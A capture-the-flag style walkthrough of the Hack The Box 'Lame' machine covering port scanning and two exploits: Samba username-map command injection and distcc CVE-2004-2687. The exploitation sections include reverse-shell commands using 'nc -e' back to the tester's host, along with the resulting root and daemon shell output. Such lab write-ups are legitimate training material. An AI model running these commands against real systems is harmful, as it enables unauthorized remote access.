# HTB - Lame
Linux Easy machine.


## Recon
Start with RustScan and get AutoRecon off and running:

```bash
# f1gur8 @ kali2102 in ~/hackthebox/tjnull/lame [18:02:53] 
$ docker run -it --rm --name rustscan rustscan/rustscan:2.0.0 -a 10.129.203.95 -- -A -sC -sV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 10.129.203.95:21
Open 10.129.203.95:22
Open 10.129.203.95:139
Open 10.129.203.95:445
Open 10.129.203.95:3632

```

### FTP is open/anonymous login allowed - not much to see here really
```
21/tcp open  ftp     syn-ack vsftpd 2.3.4
|_banner: 220 (vsFTPd 2.3.4)
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.18
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_sslv2-drown: 
Service Info: OS: Unix
```

### SMB is there, might get to play with CME for a change
```
139/tcp  open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
```

### and whatever the heck this thing is, nmap/autorecon says there is a vuln here
```bash
3632/tcp open  distccd syn-ack distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
| distcc-cve2004-2687: 
|   VULNERABLE:
|   distcc Daemon Command Execution
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2004-2687
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|       Allows executing of arbitrary commands on systems running distccd 3.1 and
|       earlier. The vulnerability is the consequence of weak service configuration.
|       
|     Disclosure date: 2002-02-01
|     Extra information:
|       
|     uid=1(daemon) gid=1(daemon) groups=1(daemon)
|   
|     References:
|       https://nvd.nist.gov/vuln/detail/CVE-2004-2687
|       https://distcc.github.io/security.html
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687
```


## Exploit

### one-stop shop on the root with CrackMapExec:
Samba is running on the box (136/445) which was learned via nmap earlier,a nd we got the Samba version as well from the nmap results for 445.  

Checking SearchSploit for samba issues:
```bash
# f1gur8 @ kali2102 in ~/hackthebox/tjnull/lame [18:52:09] 
$ searchsploit "Samba 3.0.20"     
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                            | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)  | unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow                                             | linux/remote/7701.txt
Samba < 3.0.20 - Remote Heap Overflow                                             | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                                     | linux_x86/dos/36741.py
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

that command execution script is interesting, but the metasploit part isn't very helpful:
`Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)  | unix/remote/16320.rb`

the relevant part of the script is what is being done.  If we connect to samba with a user name like the username shown - we might get some code execution, or a shell.
```ruby

def exploit
...snip...
	username = "/=`nohup " + payload.encoded + "`"      
        
```

```bash
# f1gur8 @ kali2102 in ~/hackthebox/tjnull/lame [18:56:50] C:1
$ crackmapexec smb --shares lame.htb -u './=`nohup nc -e /bin/sh 10.10.14.18 9000`' -p ''
SMB         10.129.203.95   445    LAME             [*] Unix (name:LAME) (domain:hackthebox.gr) (signing:False) (SMB
```

and indeed - a shell is caught that is running as root.  That was a bit of a surprise.
```bash
# f1gur8 @ kali2102 in ~/hackthebox/tjnull/lame [18:57:27] 
$ ip addr show tun0  
4: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 500
    link/none 
    inet 10.10.14.18/23 scope global tun0
       valid_lft forever preferred_lft forever
    inet6 dead:beef:2::1010/64 scope global 
       valid_lft forever preferred_lft forever
    inet6 fe80::2bac:a3b0:add7:a223/64 scope link stable-privacy 
       valid_lft forever preferred_lft forever

# f1gur8 @ kali2102 in ~/hackthebox/tjnull/lame [18:57:35] 
$ sudo nc -lvnp 9000
[sudo] password for f1gur8: 
listening on [any] 9000 ...
connect to [10.10.14.18] from (UNKNOWN) [10.129.203.95] 49824
uname -a
Linux lame 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
id
uid=0(root) gid=0(root)
pwd 
/
ls /root
Desktop
reset_logs.sh
root.txt
vnc.log
```

## nmap script to explore the distcc thing

```bash
# f1gur8 @ kali2102 in ~/hackthebox/tjnull/lame/autorecon/exploit/tcp3632_distccd [19:28:26] 
$ locate "*.nse" | grep -i distcc

/usr/share/nmap/scripts/distcc-cve2004-2687.nse
```

running that script we get (what we got from AutoRecon earlier)
```bash
$ nmap -Pn --script distcc-cve2004-2687.nse -p3632 lame.htb
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-25 19:31 CDT
Nmap scan report for lame.htb (10.129.203.95)
Host is up (0.052s latency).

PORT     STATE SERVICE
3632/tcp open  distccd
| distcc-cve2004-2687: 
|   VULNERABLE:
|   distcc Daemon Command Execution
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2004-2687
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|       Allows executing of arbitrary commands on systems running distccd 3.1 and
|       earlier. The vulnerability is the consequence of weak service configuration.
|       
|     Disclosure date: 2002-02-01
|     Extra information:
|       
|     uid=1(daemon) gid=1(daemon) groups=1(daemon)
|   
|     References:
|       https://nvd.nist.gov/vuln/detail/CVE-2004-2687
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687
|_      https://distcc.github.io/security.html

Nmap done: 1 IP address (1 host up) scanned in 0.40 seconds
```

checking out the script, there is an argument that can be passed.  Insted of just running ID, we could try to get it to give up a shell:

```bash
ocal nmap = require "nmap"
local match = require "match"
local shortport = require "shortport"
local stdnse = require "stdnse"
local vulns = require "vulns"

description = [[
Detects and exploits a remote code execution vulnerability in the distributed
compiler daemon distcc. The vulnerability was disclosed in 2002, but is still
present in modern implementation due to poor configuration of the service.
]]

---
-- @usage
-- nmap -p 3632 <ip> --script distcc-exec --script-args="distcc-exec.cmd='id'"

```

A little further down it shows that this isn't actually the right value (which I tried a few times and couldn't get to work correctly)... instead of script name distcc-exec it should be the actual script name  `disctcc-cve2004-2687`

```bash
# f1gur8 @ kali2102 in ~/hackthebox/tjnull/lame/autorecon/exploit/tcp3632_distccd [19:46:28] 
$ nmap -Pn -p3632 lame.htb --script distcc-cve2004-2687.nse --script-args="distcc-cve2004-2687.cmd='nc -e /bin/bash 10.10.14.18 9000'" 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-25 19:46 CDT
Nmap scan report for lame.htb (10.129.203.95)
Host is up (0.046s latency).

PORT     STATE SERVICE
3632/tcp open  distccd

Nmap done: 1 IP address (1 host up) scanned in 12.51 seconds
```

and the low-priv shell is caught this way:
```bash
# f1gur8 @ kali2102 in ~/hackthebox/tjnull/lame [19:01:11] 
$ sudo nc -lvnp 9000
[sudo] password for f1gur8: 
listening on [any] 9000 ...
connect to [10.10.14.18] from (UNKNOWN) [10.129.203.95] 43013
id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
exit
```
